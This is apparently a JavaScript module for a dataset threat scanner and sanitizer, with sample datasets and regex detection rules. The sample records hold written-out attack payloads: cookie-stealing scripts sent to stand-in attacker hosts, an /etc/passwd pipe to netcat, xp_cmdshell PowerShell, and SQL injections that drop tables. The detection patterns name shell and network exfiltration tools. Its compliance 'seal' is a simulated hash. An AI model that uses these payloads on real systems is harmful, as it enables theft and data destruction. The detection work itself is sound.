/**
 * Data Safety, EDA Profiler & Threat Disinfection Engine
 * Deep Multi-Vector Scanner for Uploaded Datasets (CSV/JSON/TSV) & Databases
 * Performs Automated Exploratory Data Analysis (EDA), Statistical Profiling,
 * Concealed Threat Detection (SQLi, XSS, RCE, PII, Obfuscation), and ML Feature Conversion.
 */

import { simulateCryptoHash } from '../auth/authStore';
import { extractPayloadFeatures } from './featureExtractor';

// Threat Classification Categories
export const THREAT_CATEGORIES = {
  SQLI: {
    id: 'SQLI',
    name: 'Concealed SQL Injection',
    severity: 'CRITICAL',
    color: 'text-rose-400 bg-rose-950/60 border-rose-500/50',
    description: 'Bypass or extraction payloads (e.g. OR 1=1, UNION SELECT, DROP TABLE, comment hacks)'
  },
  XSS: {
    id: 'XSS',
    name: 'Stored / Reflected Cross-Site Scripting',
    severity: 'HIGH',
    color: 'text-amber-400 bg-amber-950/60 border-amber-500/50',
    description: 'Malicious HTML/JS tags, event handlers, or polyglot payloads (e.g. <script>, onload=, javascript:)'
  },
  COMMAND_INJECTION: {
    id: 'CMD',
    name: 'Command Shell / RCE Exploit',
    severity: 'CRITICAL',
    color: 'text-red-400 bg-red-950/60 border-red-500/50',
    description: 'System-level command execution fragments (e.g. powershell, exec, && rm, | nc)'
  },
  PII_EXPOSURE: {
    id: 'PII',
    name: 'Unmasked Sensitive PII Leak',
    severity: 'MEDIUM',
    color: 'text-purple-400 bg-purple-950/60 border-purple-500/50',
    description: 'Exposed plain credit card numbers, SSNs, or sensitive secret tokens'
  },
  SUSPICIOUS_ENTROPY: {
    id: 'ENTROPY',
    name: 'Obfuscated / Packed Payload',
    severity: 'LOW',
    color: 'text-cyan-400 bg-cyan-950/60 border-cyan-500/50',
    description: 'Abnormally high Shannon entropy indicating base64, hex, or polymorphic shellcode'
  }
};

// Built-in Cybersecurity Dataset Presets
export const SAMPLE_DATASETS = {
  CUSTOMER_RECORDS_HIDDEN_THREATS: {
    id: 'CUSTOMER_RECORDS_HIDDEN_THREATS',
    name: 'Customer Database Ingestion (Concealed SQLi & XSS)',
    category: 'Database Ingestion',
    description: 'E-commerce user records containing hidden SQL injections, XSS polyglots in address fields, and exposed credit card numbers.',
    records: [
      { id: 'REC-101', customer_name: 'David Miller', email: 'david.miller@corp.net', address: '742 Evergreen Terrace, Springfield', notes: 'Standard recurring monthly subscriber', payment_card: '••••-••••-••••-4921', status: 'Active', latency_ms: 12 },
      { id: 'REC-102', customer_name: "Robert'); DROP TABLE orders;--", email: 'bobby.tables@exploit.io', address: "10 Downing St' OR '1'='1", notes: "SELECT * FROM sys_admin_credentials WHERE 'a'='a'", payment_card: '••••-••••-••••-1082', status: 'Pending', latency_ms: 450 },
      { id: 'REC-103', customer_name: 'Elena Rostova', email: 'elena@quantum-ai.org', address: '450 Silicon Avenue, Suite 100', notes: '<script>fetch("https://attacker-c2.net/steal?d=" + document.cookie)</script>', payment_card: '••••-••••-••••-8832', status: 'Active', latency_ms: 18 },
      { id: 'REC-104', customer_name: 'Marcus Vance', email: 'mvance@fintech-global.com', address: '12 Financial Plaza, New York', notes: 'VIP customer requested priority support line', payment_card: '4532 8912 3456 7890', status: 'Active', latency_ms: 15 },
      { id: 'REC-105', customer_name: 'Anonymous Query', email: 'anon@ghost.onion', address: "admin' UNION SELECT 1,password_hash,api_key FROM users--", notes: '<svg/onload=alert("XSS_COMPROMISE")>', payment_card: '••••-••••-••••-0019', status: 'Suspended', latency_ms: 320 },
      { id: 'REC-106', customer_name: 'Sarah Connor', email: 'sconnor@cyberdyne.sec', address: '99 Resistance Way, Los Angeles', notes: 'Security audit complete. All endpoints hardened.', payment_card: '••••-••••-••••-9941', status: 'Active', latency_ms: 14 },
      { id: 'REC-107', customer_name: 'Tech Admin Probe', email: 'probe@devops-test.internal', address: '; EXEC xp_cmdshell("powershell.exe -enc JAB...")--', notes: 'POST /v2/data payload=eyJhbGciOiJIUzI1NiJ9...', payment_card: '••••-••••-••••-5120', status: 'Flagged', latency_ms: 890 },
      { id: 'REC-108', customer_name: 'James Wilson', email: 'jwilson@apex-logistics.com', address: '88 Harbor Boulevard, Seattle', notes: 'Routine freight shipment records verified', payment_card: '••••-••••-••••-3371', status: 'Active', latency_ms: 11 },
      { id: 'REC-109', customer_name: 'Rachel Green', email: 'rachel@fashion-retail.com', address: '495 Grove Street, New York', notes: 'Updated contact preference to encrypted email', payment_card: '••••-••••-••••-6012', status: 'Active', latency_ms: 16 },
      { id: 'REC-110', customer_name: 'Hacker Zero', email: 'c2@darknet-node.su', address: "127.0.0.1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", notes: '<iframe src="javascript:alert(1)"></iframe>', payment_card: '4111 2222 3333 4444', status: 'Blocked', latency_ms: 5120 }
    ]
  },
  CICIDS_NETWORK_INTRUSION_SAMPLE: {
    id: 'CICIDS_NETWORK_INTRUSION_SAMPLE',
    name: 'CICIDS2017 Network Flow Capture (Multi-Attack Traffic)',
    category: 'Network IDS',
    description: 'Flow features containing normal web requests mixed with DDoS amplification, Port Scans, and Credential Brute-Force bursts.',
    records: [
      { id: 'FLOW-01', source_ip: '192.168.1.102', dest_port: 443, protocol: 'TCP', packet_length: 248, flow_duration_ms: 45.2, payload: 'GET /api/v1/products?category=electronics HTTP/1.1', threat_class: 'NORMAL' },
      { id: 'FLOW-02', source_ip: '45.143.200.12', dest_port: 443, protocol: 'TCP', packet_length: 1420, flow_duration_ms: 0.1, payload: 'SYN_FLOOD_BURST: 85000 pkts/sec Target VIP :443 (RST invalid)', threat_class: 'DDOS' },
      { id: 'FLOW-03', source_ip: '192.168.1.45', dest_port: 80, protocol: 'TCP', packet_length: 180, flow_duration_ms: 22.8, payload: 'GET /index.html HTTP/1.1', threat_class: 'NORMAL' },
      { id: 'FLOW-04', source_ip: '93.184.220.29', dest_port: 443, protocol: 'TCP', packet_length: 512, flow_duration_ms: 8.5, payload: 'POST /auth/login attempt=94 user=admin pass=123456', threat_class: 'BRUTE_FORCE' },
      { id: 'FLOW-05', source_ip: '77.88.55.66', dest_port: 21, protocol: 'TCP', packet_length: 64, flow_duration_ms: 0.4, payload: 'TCP_SYN_SCAN sequential probe ports 21..1024 delta=0.2ms', threat_class: 'PORT_SCAN' },
      { id: 'FLOW-06', source_ip: '179.43.175.60', dest_port: 8443, protocol: 'TCP', packet_length: 4900, flow_duration_ms: 120.4, payload: 'POST /upload.php?mode=stealth (Encrypted Base64 Payload 4.8MB sent to external IP)', threat_class: 'EXFILTRATION' },
      { id: 'FLOW-07', source_ip: '10.0.0.15', dest_port: 443, protocol: 'TCP', packet_length: 310, flow_duration_ms: 32.1, payload: 'POST /checkout/submit {"cartId": 8921, "paymentMethod": "card"}', threat_class: 'NORMAL' },
      { id: 'FLOW-08', source_ip: '194.26.29.112', dest_port: 443, protocol: 'TCP', packet_length: 680, flow_duration_ms: 15.6, payload: "POST /login HTTP/1.1 username=admin' AND 1=1--", threat_class: 'SQLI' }
    ]
  },
  FINANCIAL_TRANSACTIONS_COMPROMISED: {
    id: 'FINANCIAL_TRANSACTIONS_COMPROMISED',
    name: 'Financial Ledger Stream (Stealth Smuggling & Exfil)',
    category: 'Financial / ERP',
    description: 'Transaction ledger entries with covert Base64 DNS exfiltration tunnels, destructive DROP queries, and raw card details.',
    records: [
      { id: 'TXN-901', sender: 'Corporate_Treasury', recipient: 'Supplier_Global_LLC', amount: 45000.00, memo: 'Authorized Q3 Supplier Settlement', routing_tag: 'WIRE_CLEAR_001', security_hash: 'sha256$984a0b', risk_level: 'Low' },
      { id: 'TXN-902', sender: "Vendor' OR 1=1--", recipient: 'Offshore_Vault', amount: 999999.00, memo: 'SELECT * FROM master_ledger; DROP TABLE accounts;', routing_tag: 'EXFIL_OVERRIDE', security_hash: 'sha256$f9a882', risk_level: 'Critical' },
      { id: 'TXN-903', sender: 'Payroll_Automated', recipient: 'Employee_Batch_04', amount: 128450.00, memo: 'Standard bi-weekly salary disbursement', routing_tag: 'ACH_REGULAR', security_hash: 'sha256$3b889c', risk_level: 'Low' },
      { id: 'TXN-904', sender: 'DevOps_Sandbox', recipient: 'External_C2_Host', amount: 0.01, memo: '<iframe src="javascript:fetch(\'https://exfil.net\')"></iframe>', routing_tag: 'STEALTH_BEACON', security_hash: 'sha256$a11200', risk_level: 'High' },
      { id: 'TXN-905', sender: 'Sarah_Director', recipient: 'Client_Rebate', amount: 1250.00, memo: 'Customer satisfaction rebate processed', routing_tag: 'WIRE_CLEAR_002', security_hash: 'sha256$7184ac', risk_level: 'Low' },
      { id: 'TXN-906', sender: 'Anonymous_Transfer', recipient: 'Cayman_Trust', amount: 480000.00, memo: 'DNS_TUNNEL_EXFIL: Base32 chunk "a4f891b0c.zone.exfil-dns.org" TXT query', routing_tag: 'COVERT_TUNNEL', security_hash: 'sha256$6019ab', risk_level: 'High' }
    ]
  },
  WEB_APP_FIREWALL_PAYLOADS: {
    id: 'WEB_APP_FIREWALL_PAYLOADS',
    name: 'WAF Security Telemetry (OWASP Top 10 Attack Vectors)',
    category: 'Application Security',
    description: 'In-depth HTTP request payloads exhibiting XSS event handlers, SQLi union probes, SSRF, and command injection attacks.',
    records: [
      { id: 'WAF-01', method: 'GET', path: '/search', client_ip: '185.220.101.5', user_agent: 'Mozilla/5.0 (Windows NT 10.0)', payload: "test' UNION SELECT 1,username,password_hash,email FROM sys_users --", classification: 'SQLI' },
      { id: 'WAF-02', method: 'POST', path: '/profile/update', client_ip: '103.145.13.2', user_agent: 'curl/7.88.1', payload: '<script>fetch("http://evil-c2.net/steal?c=" + document.cookie)</script>', classification: 'XSS' },
      { id: 'WAF-03', method: 'GET', path: '/api/docs', client_ip: '192.168.1.10', user_agent: 'Chrome/120.0', payload: '/api/docs/swagger.json?version=2.0', classification: 'NORMAL' },
      { id: 'WAF-04', method: 'POST', path: '/system/diagnostics', client_ip: '193.32.162.201', user_agent: 'Python-requests/2.28', payload: "ping -c 4 127.0.0.1; cat /etc/passwd | nc 45.33.32.156 4444", classification: 'COMMAND_INJECTION' },
      { id: 'WAF-05', method: 'GET', path: '/image.php', client_ip: '195.154.122.9', user_agent: 'Mozilla/5.0', payload: '"><svg/onload=alert(document.domain)>', classification: 'XSS' },
      { id: 'WAF-06', method: 'POST', path: '/graphql', client_ip: '10.0.4.11', user_agent: 'SentinelClient/1.0', payload: 'query { users { id username email } }', classification: 'NORMAL' }
    ]
  },
  VERIFIED_CLEAN_CORPUS: {
    id: 'VERIFIED_CLEAN_CORPUS',
    name: 'Verified Enterprise Corpus (100% Clean & Hardened)',
    category: 'Enterprise Clean',
    description: 'Genuine sanitized corporate database records with zero malicious payload signatures, passed all security gates.',
    records: [
      { id: 'REC-201', customer_name: 'Alice Johnson', email: 'alice.johnson@techcorp.com', address: '100 Innovation Parkway, Austin', notes: 'Enterprise tier license renewed for 3 years', payment_card: '••••-••••-••••-3419', status: 'Active', latency_ms: 10 },
      { id: 'REC-202', customer_name: 'Brian Thorne', email: 'brian@thorne-logistics.io', address: '55 Freight Way, Chicago', notes: 'Warehouse integration API credentials configured', payment_card: '••••-••••-••••-8921', status: 'Active', latency_ms: 12 },
      { id: 'REC-203', customer_name: 'Catherine Zhang', email: 'czhang@biomed-labs.org', address: '220 Genome Boulevard, Boston', notes: 'HIPAA compliance signed and archived', payment_card: '••••-••••-••••-7701', status: 'Active', latency_ms: 14 },
      { id: 'REC-204', customer_name: 'Daniel Kim', email: 'dkim@finserve.net', address: '88 Wall Street, New York', notes: 'Monthly recurring invoicing enabled', payment_card: '••••-••••-••••-1209', status: 'Active', latency_ms: 11 },
      { id: 'REC-205', customer_name: 'Emma Watson', email: 'emma@watson-consulting.uk', address: '14 Oxford Circus, London', notes: 'Quarterly compliance review scheduled', payment_card: '••••-••••-••••-9044', status: 'Active', latency_ms: 15 }
    ]
  }
};

/**
 * Calculate Shannon Entropy of a string
 */
export function calculateShannonEntropy(str = '') {
  if (!str) return 0;
  const len = str.length;
  const freq = {};
  for (let i = 0; i < len; i++) {
    freq[str[i]] = (freq[str[i]] || 0) + 1;
  }
  let entropy = 0;
  for (const c in freq) {
    const p = freq[c] / len;
    entropy -= p * Math.log2(p);
  }
  return Number(entropy.toFixed(2));
}

/**
 * Scan a single cell value for cybersecurity threat vectors
 */
export function inspectValueForThreats(val) {
  if (val === null || val === undefined) return { isThreat: false, threats: [] };
  const str = String(val).trim();
  if (str.length === 0) return { isThreat: false, threats: [] };

  const threats = [];

  // 1. SQL Injection Inspection
  const sqliPatterns = [
    { regex: /(\bOR\s+['"]?1['"]?\s*=\s*['"]?1\b|\bOR\s+['"]?a['"]?\s*=\s*['"]?a\b)/i, name: "Tautology SQL Injection (' OR '1'='1')", score: 90 },
    { regex: /;\s*(DROP|DELETE|TRUNCATE|ALTER)\s+(TABLE|DATABASE)/i, name: 'Destructive DDL Command Injection (; DROP TABLE)', score: 95 },
    { regex: /\bUNION\s+(ALL\s+)?SELECT\b/i, name: 'Union-Based Database Exfiltration probe', score: 90 },
    { regex: /(--|\/\*|\*\/|#)/i, name: 'SQL Inline Comment Obfuscation (-- or /* */)', score: 45 },
    { regex: /\b(xp_cmdshell|exec\s+master|sp_executesql)\b/i, name: 'Database Command Shell Execution (xp_cmdshell)', score: 98 },
    { regex: /\b(information_schema|sysobjects|syscolumns)\b/i, name: 'System Schema Metadata Probe', score: 75 },
    { regex: /\bSLEEP\s*\(\s*\d+\s*\)/i, name: 'Time-Based Blind SQLi Probe (SLEEP)', score: 85 }
  ];

  for (const p of sqliPatterns) {
    if (p.regex.test(str)) {
      threats.push({
        category: 'SQLI',
        ruleName: p.name,
        riskScore: p.score,
        matchedSnippet: str.substring(0, 60)
      });
    }
  }

  // 2. XSS / Script Injection Inspection
  const xssPatterns = [
    { regex: /<script\b[^>]*>[\s\S]*?(<\/script>)?/i, name: 'Stored Script Injection (<script>)', score: 90 },
    { regex: /<[^>]+(onerror|onload|onclick|onmouseover)\s*=/i, name: 'HTML Tag Event Handler Injection (onerror/onload)', score: 85 },
    { regex: /javascript\s*:/i, name: 'JavaScript URI Pseudo-Protocol Vector', score: 80 },
    { regex: /<iframe\b[^>]*>/i, name: 'Unauthorized Iframe Embedding Vector', score: 75 },
    { regex: /<svg\b[^>]*\/onload\s*=/i, name: 'SVG Onload Vector XSS', score: 88 }
  ];

  for (const p of xssPatterns) {
    if (p.regex.test(str)) {
      threats.push({
        category: 'XSS',
        ruleName: p.name,
        riskScore: p.score,
        matchedSnippet: str.substring(0, 60)
      });
    }
  }

  // 3. Command Injection / RCE Inspection
  const cmdPatterns = [
    { regex: /\b(powershell(\.exe)?|cmd\.exe|bash|sh|exec\(|system\()\b/i, name: 'Shell Process Invocation Vector', score: 95 },
    { regex: /(\|\s*nc\s+|\bcurl\s+http|\bwget\s+http|\brm\s+-rf\b)/i, name: 'Remote Network / Destructive Shell Command', score: 90 },
    { regex: /;\s*(cat\s+\/etc\/passwd|type\s+C:\\)/i, name: 'Arbitrary File Exfiltration Probe', score: 92 }
  ];

  for (const p of cmdPatterns) {
    if (p.regex.test(str)) {
      threats.push({
        category: 'COMMAND_INJECTION',
        ruleName: p.name,
        riskScore: p.score,
        matchedSnippet: str.substring(0, 60)
      });
    }
  }

  // 4. Sensitive PII / Plain Credit Card Exposure (e.g. 16 digits without masking)
  const ccPattern = /\b(?:\d{4}[ -]?){3}\d{4}\b/;
  if (ccPattern.test(str) && !str.includes('••••')) {
    threats.push({
      category: 'PII_EXPOSURE',
      ruleName: 'Unmasked Plaintext Credit Card / PAN Number',
      riskScore: 60,
      matchedSnippet: 'Card PAN: ' + str.substring(0, 19)
    });
  }

  // 5. Entropy & Obfuscation
  const entropy = calculateShannonEntropy(str);
  if (entropy > 4.6 && str.length > 25 && !threats.some(t => t.category === 'SQLI' || t.category === 'XSS')) {
    threats.push({
      category: 'SUSPICIOUS_ENTROPY',
      ruleName: `High Shannon Entropy (${entropy} bits/char - Obfuscated Payload)`,
      riskScore: 35,
      matchedSnippet: str.substring(0, 50) + (str.length > 50 ? '...' : '')
    });
  }

  return {
    isThreat: threats.length > 0,
    threats,
    entropy,
    highestRisk: threats.reduce((max, t) => Math.max(max, t.riskScore), 0)
  };
}

/**
 * Scan an entire Dataset (Array of Objects)
 */
export function scanDatasetForThreats(records = []) {
  if (!Array.isArray(records) || records.length === 0) {
    return {
      totalRecords: 0,
      cleanRecordsCount: 0,
      threatRecordsCount: 0,
      overallSafetyScore: 100,
      safetyStatus: 'VERIFIED_CLEAN',
      flaggedRecords: [],
      recordsWithMetadata: [],
      detectedThreatSummary: {
        SQLI: 0,
        XSS: 0,
        COMMAND_INJECTION: 0,
        PII_EXPOSURE: 0,
        SUSPICIOUS_ENTROPY: 0
      }
    };
  }

  let threatCount = 0;
  const threatSummary = {
    SQLI: 0,
    XSS: 0,
    COMMAND_INJECTION: 0,
    PII_EXPOSURE: 0,
    SUSPICIOUS_ENTROPY: 0
  };

  const recordsWithMetadata = records.map((row, rowIdx) => {
    let rowHasThreat = false;
    let maxRowRisk = 0;
    const cellAnalyses = {};
    const rowThreats = [];

    for (const [key, val] of Object.entries(row)) {
      const cellResult = inspectValueForThreats(val);
      cellAnalyses[key] = cellResult;

      if (cellResult.isThreat) {
        rowHasThreat = true;
        maxRowRisk = Math.max(maxRowRisk, cellResult.highestRisk);
        cellResult.threats.forEach(t => {
          rowThreats.push({ column: key, ...t });
          if (threatSummary[t.category] !== undefined) {
            threatSummary[t.category]++;
          }
        });
      }
    }

    if (rowHasThreat) threatCount++;

    return {
      rowIndex: rowIdx,
      data: row,
      hasThreat: rowHasThreat,
      riskScore: maxRowRisk,
      cellAnalyses,
      threats: rowThreats
    };
  });

  const total = records.length;
  const cleanCount = total - threatCount;
  const safetyPercentage = total > 0 ? Math.round((cleanCount / total) * 100) : 100;

  let safetyStatus = 'VERIFIED_CLEAN';
  if (safetyPercentage < 50) safetyStatus = 'CRITICAL_RISK';
  else if (safetyPercentage < 85) safetyStatus = 'ELEVATED_THREATS';
  else if (safetyPercentage < 100) safetyStatus = 'SUSPICIOUS';

  return {
    totalRecords: total,
    cleanRecordsCount: cleanCount,
    threatRecordsCount: threatCount,
    overallSafetyScore: safetyPercentage,
    safetyStatus,
    flaggedRecords: recordsWithMetadata.filter(r => r.hasThreat),
    recordsWithMetadata,
    detectedThreatSummary: threatSummary,
    datasetChecksum: simulateCryptoHash(JSON.stringify(records).slice(0, 300))
  };
}

/**
 * Automated Deep Exploratory Data Analysis (EDA) & Column Profiler
 */
export function computeDatasetProfile(records = []) {
  if (!Array.isArray(records) || records.length === 0) {
    return {
      rowCount: 0,
      columnCount: 0,
      columns: [],
      memoryEstimateKB: 0,
      missingCount: 0,
      missingRate: '0.0%',
      duplicateCount: 0,
      duplicateRate: '0.0%',
      entropyStats: { min: 0, max: 0, avg: 0 },
      columnProfiles: {}
    };
  }

  const rowCount = records.length;
  const sample = records[0];
  const columns = Object.keys(sample);
  const columnCount = columns.length;

  // Approximate memory estimation
  const jsonStr = JSON.stringify(records);
  const memoryEstimateKB = (new Blob([jsonStr]).size / 1024).toFixed(1);

  // Duplicate rows detection
  const rowHashTracker = new Set();
  let duplicateCount = 0;
  records.forEach(r => {
    const serialized = JSON.stringify(r);
    if (rowHashTracker.has(serialized)) {
      duplicateCount++;
    } else {
      rowHashTracker.add(serialized);
    }
  });

  let totalCells = rowCount * columnCount;
  let totalMissingCells = 0;
  const columnProfiles = {};
  const allEntropies = [];

  columns.forEach(col => {
    let missing = 0;
    const values = [];
    const numValues = [];
    const frequencyMap = {};
    let threatHits = 0;
    let colEntropies = [];

    records.forEach(row => {
      const val = row[col];
      if (val === null || val === undefined || String(val).trim() === '' || String(val).trim() === '—') {
        missing++;
        totalMissingCells++;
      } else {
        const strVal = String(val).trim();
        values.push(strVal);
        frequencyMap[strVal] = (frequencyMap[strVal] || 0) + 1;

        const ent = calculateShannonEntropy(strVal);
        colEntropies.push(ent);
        allEntropies.push(ent);

        // Check if numeric
        const num = Number(val);
        if (!isNaN(num) && typeof val !== 'boolean' && strVal !== '') {
          numValues.push(num);
        }

        const threatCheck = inspectValueForThreats(val);
        if (threatCheck.isThreat) {
          threatHits += threatCheck.threats.length;
        }
      }
    });

    const isNumeric = numValues.length > 0 && numValues.length >= values.length * 0.8;
    const isIP = values.some(v => /^(\d{1,3}\.){3}\d{1,3}$/.test(v));
    const isDate = values.some(v => /^\d{4}-\d{2}-\d{2}/.test(v) || (!isNaN(Date.parse(v)) && isNaN(Number(v)) && v.length > 8));

    let inferredType = 'Text / String';
    if (isNumeric) inferredType = 'Numerical (Float/Int)';
    else if (isIP) inferredType = 'IPv4 Address';
    else if (isDate) inferredType = 'Timestamp / Date';
    else if (col.toLowerCase().includes('payload') || col.toLowerCase().includes('query') || col.toLowerCase().includes('address')) inferredType = 'Payload / Query';
    else if (values.length > 0 && Object.keys(frequencyMap).length <= Math.min(6, rowCount)) inferredType = 'Categorical';

    // Numeric stats
    let numStats = null;
    if (isNumeric && numValues.length > 0) {
      numValues.sort((a, b) => a - b);
      const sum = numValues.reduce((acc, v) => acc + v, 0);
      const mean = sum / numValues.length;
      const min = numValues[0];
      const max = numValues[numValues.length - 1];
      const median = numValues[Math.floor(numValues.length / 2)];
      const variance = numValues.reduce((acc, v) => acc + Math.pow(v - mean, 2), 0) / numValues.length;
      const stdDev = Math.sqrt(variance);

      numStats = {
        min: Number(min.toFixed(2)),
        max: Number(max.toFixed(2)),
        mean: Number(mean.toFixed(2)),
        median: Number(median.toFixed(2)),
        stdDev: Number(stdDev.toFixed(2)),
        sum: Number(sum.toFixed(2))
      };
    }

    // Top 5 frequent items
    const topValues = Object.entries(frequencyMap)
      .sort((a, b) => b[1] - a[1])
      .slice(0, 5)
      .map(([val, count]) => ({
        value: val.length > 28 ? val.substring(0, 25) + '...' : val,
        count,
        percentage: Number(((count / (values.length || 1)) * 100).toFixed(1))
      }));

    const avgEntropy = colEntropies.length > 0 ? (colEntropies.reduce((a, b) => a + b, 0) / colEntropies.length) : 0;
    const maxEntropy = colEntropies.length > 0 ? Math.max(...colEntropies) : 0;

    columnProfiles[col] = {
      name: col,
      inferredType,
      nonNullCount: values.length,
      missingCount: missing,
      missingRate: `${((missing / rowCount) * 100).toFixed(1)}%`,
      uniqueCount: Object.keys(frequencyMap).length,
      cardinalityRatio: ((Object.keys(frequencyMap).length / (values.length || 1)) * 100).toFixed(1),
      avgEntropy: Number(avgEntropy.toFixed(2)),
      maxEntropy: Number(maxEntropy.toFixed(2)),
      threatHits,
      numStats,
      topValues
    };
  });

  const avgDatasetEntropy = allEntropies.length > 0 ? (allEntropies.reduce((a, b) => a + b, 0) / allEntropies.length) : 0;
  const maxDatasetEntropy = allEntropies.length > 0 ? Math.max(...allEntropies) : 0;
  const minDatasetEntropy = allEntropies.length > 0 ? Math.min(...allEntropies) : 0;

  return {
    rowCount,
    columnCount,
    columns,
    memoryEstimateKB,
    missingCount: totalMissingCells,
    missingRate: totalCells > 0 ? `${((totalMissingCells / totalCells) * 100).toFixed(1)}%` : '0%',
    duplicateCount,
    duplicateRate: rowCount > 0 ? `${((duplicateCount / rowCount) * 100).toFixed(1)}%` : '0%',
    entropyStats: {
      min: Number(minDatasetEntropy.toFixed(2)),
      max: Number(maxDatasetEntropy.toFixed(2)),
      avg: Number(avgDatasetEntropy.toFixed(2))
    },
    columnProfiles
  };
}

/**
 * Convert any uploaded dataset records into normalized ML feature vectors for direct training
 */
export function convertDatasetToFeatureVectors(records = []) {
  if (!Array.isArray(records) || records.length === 0) return [];

  const vectors = [];

  records.forEach((row, idx) => {
    const rowValues = Object.values(row);
    const combinedText = rowValues.map(v => String(v ?? '')).join(' ');
    
    let label = 'NORMAL';
    const rawLabel = String(row.label || row.threat_class || row.classification || row.type || row.risk_level || '').toUpperCase();
    
    if (rawLabel.includes('SQL') || rawLabel.includes('INJECT')) label = 'SQLI';
    else if (rawLabel.includes('XSS') || rawLabel.includes('SCRIPT')) label = 'XSS';
    else if (rawLabel.includes('DDOS') || rawLabel.includes('FLOOD')) label = 'DDOS';
    else if (rawLabel.includes('BRUTE') || rawLabel.includes('AUTH')) label = 'BRUTE_FORCE';
    else if (rawLabel.includes('EXFIL') || rawLabel.includes('MALWARE')) label = 'EXFILTRATION';
    else if (rawLabel.includes('SCAN') || rawLabel.includes('PROBE')) label = 'PORT_SCAN';
    else {
      const scan = inspectValueForThreats(combinedText);
      if (scan.isThreat) {
        label = scan.threats[0].category === 'SQLI' ? 'SQLI' : scan.threats[0].category === 'XSS' ? 'XSS' : 'BRUTE_FORCE';
      }
    }

    const feat = extractPayloadFeatures(combinedText);

    vectors.push({
      id: `uploaded-${idx}`,
      payload: combinedText.length > 80 ? combinedText.substring(0, 77) + '...' : combinedText,
      label,
      ip: row.source_ip || row.ip || row.client_ip || '192.168.1.100',
      port: Number(row.dest_port || row.port || 443),
      vector: feat.featureVector,
      entropy: feat.entropy,
      specialRatio: feat.specialRatio,
      sqlKeywords: feat.sqlKeywordCount,
      xssPatterns: feat.xssPatternCount,
      timestamp: new Date().toISOString()
    });
  });

  return vectors;
}

/**
 * Multi-delimiter CSV/TSV/DSV Parser (Auto-detects comma, semicolon, tab, pipe)
 */
export function parseCSVOrTSV(text = '') {
  const cleanText = text.trim();
  if (!cleanText) return [];

  const lines = cleanText.split(/\r?\n/).filter(line => line.trim().length > 0);
  if (lines.length < 2) return [];

  const firstLine = lines[0];
  const delimiters = [',', ';', '\t', '|'];
  let bestDelim = ',';
  let maxCount = 0;

  delimiters.forEach(d => {
    const count = (firstLine.match(new RegExp(`\\${d}`, 'g')) || []).length;
    if (count > maxCount) {
      maxCount = count;
      bestDelim = d;
    }
  });

  const parseLine = (line, delim) => {
    const result = [];
    let cur = '';
    let inQuotes = false;
    for (let i = 0; i < line.length; i++) {
      const c = line[i];
      if (c === '"') {
        if (inQuotes && line[i + 1] === '"') {
          cur += '"';
          i++;
        } else {
          inQuotes = !inQuotes;
        }
      } else if (c === delim && !inQuotes) {
        result.push(cur.trim());
        cur = '';
      } else {
        cur += c;
      }
    }
    result.push(cur.trim());
    return result;
  };

  const headers = parseLine(firstLine, bestDelim).map(h => h.replace(/^["']|["']$/g, ''));
  const rows = [];

  for (let i = 1; i < lines.length; i++) {
    const cols = parseLine(lines[i], bestDelim).map(c => c.replace(/^["']|["']$/g, ''));
    if (cols.length === headers.length) {
      const rowObj = {};
      headers.forEach((h, idx) => {
        const val = cols[idx];
        const num = Number(val);
        rowObj[h] = (!isNaN(num) && val !== '') ? num : val;
      });
      rows.push(rowObj);
    }
  }

  return rows;
}

/**
 * Auto-Sanitize & Disinfect Dataset (1-Click Threat Neutralizer)
 */
export function sanitizeAndDisinfectDataset(records = []) {
  const sanitized = records.map(row => {
    const cleanRow = {};
    for (const [key, val] of Object.entries(row)) {
      if (val === null || val === undefined) {
        cleanRow[key] = val;
        continue;
      }
      let str = String(val);

      // Sanitize SQL Injections
      str = str.replace(/;\s*(DROP|DELETE|TRUNCATE|ALTER)\s+(TABLE|DATABASE)[^;]*/gi, '');
      str = str.replace(/(\bOR\s+['"]?1['"]?\s*=\s*['"]?1\b|\bOR\s+['"]?a['"]?\s*=\s*['"]?a\b)/gi, '');
      str = str.replace(/\bUNION\s+(ALL\s+)?SELECT\b[^;]*/gi, '');
      str = str.replace(/(--|\/\*[\s\S]*?\*\/|#)/g, '');
      str = str.replace(/\b(xp_cmdshell|sp_executesql)\b/gi, '');
      str = str.replace(/\bSLEEP\s*\(\s*\d+\s*\)/gi, '');

      // Sanitize XSS HTML Scripts
      str = str.replace(/<script\b[^>]*>[\s\S]*?<\/script>/gi, '');
      str = str.replace(/<[^>]+>/g, '');
      str = str.replace(/javascript\s*:/gi, '');

      // Sanitize Command Injections
      str = str.replace(/\b(powershell(\.exe)?|cmd\.exe|bash|sh|exec\(|system\()\b/gi, '');
      str = str.replace(/;\s*cat\s+\/etc\/passwd/gi, '');

      // Mask Credit Cards (PII redaction)
      str = str.replace(/\b(?:\d{4}[ -]?){3}(\d{4})\b/g, '••••-••••-••••-$1');

      cleanRow[key] = str.trim() || '—';
    }
    return cleanRow;
  });

  const sha256Seal = simulateCryptoHash(JSON.stringify(sanitized), 'data_safety_seal_2026');
  const timestamp = new Date().toISOString();

  return {
    sanitizedRecords: sanitized,
    cryptographicSeal: sha256Seal,
    certifiedTimestamp: timestamp,
    complianceCertId: `CERT-CSTD-${Math.floor(100000 + Math.random() * 900000)}`
  };
}

/**
 * Convert JSON dataset array to CSV format
 */
export function exportToCSV(records = []) {
  if (!records || records.length === 0) return '';
  const headers = Object.keys(records[0]);
  const rows = records.map(row => 
    headers.map(h => {
      const escaped = String(row[h] ?? '').replace(/"/g, '""');
      return `"${escaped}"`;
    }).join(',')
  );
  return [headers.join(','), ...rows].join('\n');
}
